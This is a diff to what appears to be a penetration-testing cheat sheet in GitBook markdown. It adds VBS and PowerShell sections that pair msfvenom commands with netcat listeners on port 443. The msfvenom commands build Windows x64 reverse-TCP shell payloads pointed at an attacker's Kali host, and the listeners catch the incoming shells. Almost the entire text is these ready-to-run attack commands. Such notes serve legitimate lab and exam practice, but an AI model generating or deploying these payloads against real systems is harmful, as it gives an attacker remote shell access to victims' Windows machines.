@@ -35,6 +35,34 @@ rlwrap nc -lvnp 443
 
 ### VBS
 
+**Kali #1**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vba -o exploit.vbs
+```
+
+**Kali #2**
+
+```
+rlwrap nc -lvnp 443
+```
+
 ### DOC
 
 ### PS1
+
+**Kali #1**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f psh -o exploit.ps1
+```
+
+**Kali #2**
+
+```
+rlwrap nc -lvnp 443
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
